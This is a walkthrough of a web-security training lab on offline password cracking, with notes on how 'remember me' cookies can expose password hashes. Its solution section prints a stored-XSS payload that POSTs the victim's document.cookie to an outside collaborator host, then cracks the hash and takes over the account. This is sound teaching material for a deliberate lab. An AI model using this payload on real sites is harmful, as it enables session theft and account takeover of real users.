Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as XSS, an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that.

If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.

In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed.

Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption.

## Steps to solve lab
### Title - Offline password cracking

**Desc** - This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

**Creds** - 
- Your credentials: `wiener:peter`
- Victim's username: `carlos`

1. As the lab description says that there is a XSS vulnerability in the comment functionality of the website, so we have to go to one of blogs and try to inject the below payload to get the users "stay-logged-in" cookie.
**Payload**  -
```js
<script> 
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { 
method: 'POST', 
mode: 'no-cors', 
body:document.cookie 
}); 
</script>
```

**Copy the collaborator server domain from burp as follows** - 
![[authentication7.png]]

**Paste in the comment as follows** - 
![[authentication8.png]]

**Got the carlos "stay-logged-in" cookie** - 
![[authentication9.png]]

**It is base64 encoded as we decoded in burp decoder** - 
![[authentication10.png]]
As the lab description says that, the hash of password of user stored in "stay-logged-in" cookie. 

**We got the password in plaintext after decrypting it with [crackstation](https://crackstation.net/)
![[authentication11.png]]

2. Login with the credentials and deleting the account of carlos.
![[authentication12.png]]
